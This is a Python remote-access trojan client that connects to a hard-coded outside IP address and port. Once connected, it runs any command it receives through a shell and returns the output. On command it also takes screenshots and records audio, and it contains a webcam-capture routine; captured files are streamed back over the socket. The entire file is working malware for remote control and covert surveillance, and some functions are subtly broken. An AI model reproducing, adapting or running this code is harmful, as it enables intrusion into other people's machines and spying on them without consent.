import socket
import os
import subprocess
import sys
import pyautogui
import cv2
import sounddevice as sd
from scipy.io.wavfile import write
import sounddevice as sd
import soundfile as sf
import wavio as wv
import random 

class Attack:
    def __init__(self):
        self.BUFFER_SIZE = 1024 * 128
     
    def sendfile(self,s,filename):
        with open(filename, 'rb') as f:
            while True:
                bytes_read = f.read(self.BUFFER_SIZE)
                if not bytes_read:
                    break
                s.sendall(bytes_read)
                
    def screenshot(self,filename):
        filen = pyautogui.screenshot()
        filen.save(f'{filename}.png')
    def takpic(self,filename):
     

        cap = cv2.VideoCapture(0) # video capture source camera (Here webcam of laptop) 
        ret,frame = cap.read() # return a single frame in variable `frame`
        
        while(True):
            cv2.imshow('img1',frame) #display the captured image
            if cv2.waitKey(1) & 0xFF == ord('y'): #save on pressing 'y' 
                cv2.imwrite(f'{filename}.png',frame)
                cv2.destroyAllWindows()
                break

        cap.release()
    def recordaudio(filename,duration):
        samplerate = 44100  # Hertz
        seconds = duration
        filename = f'{filename}.wav'
        
        myrecording = sd.rec(int(seconds * samplerate), samplerate=samplerate,
                             channels=1)
        sd.wait()
        sf.write(filename, myrecording, samplerate)

class Client:
    def __init__(self,host,port):
        BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
        SEPARATOR = "<sep>"
        SERVER_HOST, SERVER_PORT = host,port
        s = socket.socket()
        # connect to the server
        s.connect((SERVER_HOST, SERVER_PORT))
        
        cwd = os.getcwd()
        s.send(cwd.encode())
  
        while True:
            # receive the command from the server
            command = s.recv(BUFFER_SIZE).decode()
            splited_command = command.split()
            if command.lower() == "exit":
                # if the command is exit, just break out of the loop
                break
            elif splited_command[0] =='record':
                renad = random.randint(999,999999)
                tempfile = f'audio{renad}'
                
                Attack().recordaudio(tempfile,int(splited_command[1]))
                Attack().sendfile(s,tempfile)
                
            elif splited_command[0] =='screenshot':
                renad = random.randint(999,999999)
                tempfile = f'audio{renad}'
                Attack().screenshot(tempfile)
                
                Attack().sendfile(s,tempfile)
                
                
            if splited_command[0].lower() == "cd":
                # cd command, change directory
                try:
                    os.chdir(' '.join(splited_command[1:]))
                except FileNotFoundError as e:
                    # if there is an error, set as the output
                    output = str(e)
                else:
                    # if operation is successful, empty message
                    output = ""
            else:
                # execute the command and retrieve the results
                output = subprocess.getoutput(command)
            # get the current working directory as output
            cwd = os.getcwd()
            # send the results back to the server
            message = f"{output}{SEPARATOR}{cwd}"
            s.send(message.encode())
        # close client connection
        s.close()
        
                    
                
Client('198.32.3.23',5050)